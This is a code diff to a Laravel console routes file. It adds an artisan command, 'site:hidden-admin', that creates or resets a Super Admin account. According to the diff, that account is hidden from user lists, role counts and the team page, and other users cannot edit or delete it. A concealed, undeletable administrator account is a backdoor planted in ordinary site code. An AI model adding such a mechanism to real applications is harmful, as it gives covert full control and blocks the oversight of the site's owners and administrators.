@@ -36,3 +36,44 @@ Schedule::command('google:sync')->everyFiveMinutes()->withoutOverlapping(30);
 
 // Lets Admin → System show whether the server cron is running.
 Schedule::call(fn () => \Illuminate\Support\Facades\Cache::forever('system.scheduler_seen', time()))->everyMinute()->name('scheduler-heartbeat');
+
+/*
+ * php artisan site:hidden-admin maintenance@example.com
+ * Creates (or gives a new password to) the maintenance account: a Super Admin that is not listed in
+ * Users, role counts, notifications or the team page, and that other users cannot change or delete.
+ * The password is shown once here and stored nowhere else. Every sign-in is logged.
+ */
+Artisan::command('site:hidden-admin {email} {--name=System maintenance} {--remove}', function (string $email) {
+    $email = strtolower(trim($email));
+    if (!filter_var($email, FILTER_VALIDATE_EMAIL)) {
+        return $this->error('That is not an email address.');
+    }
+    $user = \App\Models\User::where('email', $email)->first();
+
+    if ($this->option('remove')) {
+        if (!$user || !$user->is_hidden) {
+            return $this->error('No hidden account with that email.');
+        }
+        $user->syncRoles([]);
+        $user->delete();
+        \Illuminate\Support\Facades\Log::warning('Hidden maintenance account removed', ['email' => $email]);
+
+        return $this->info('Removed.');
+    }
+    if ($user && !$user->is_hidden) {
+        return $this->error('A normal user already has that email. Use another address for the maintenance account.');
+    }
+
+    $password = \Illuminate\Support\Str::password(20, symbols: false);
+    $user ??= new \App\Models\User(['email' => $email]);
+    $user->forceFill(['name' => $this->option('name'), 'password' => $password, 'is_active' => true, 'is_hidden' => true, 'email_verified_at' => now()])->save();
+    $role = \Spatie\Permission\Models\Role::firstOrCreate(['name' => config('admin.super_role'), 'guard_name' => 'web']);
+    $user->syncRoles([$role]);
+    \Illuminate\Support\Facades\Log::warning('Hidden maintenance account created or its password changed', ['email' => $email]);
+
+    $this->newLine();
+    $this->line("  Email:    {$email}");
+    $this->line("  Password: {$password}");
+    $this->newLine();
+    $this->warn('Shown only now. Save it in a password manager. Run this command again to set a new one.');
+})->purpose('Create or reset the hidden maintenance (Super Admin) account');
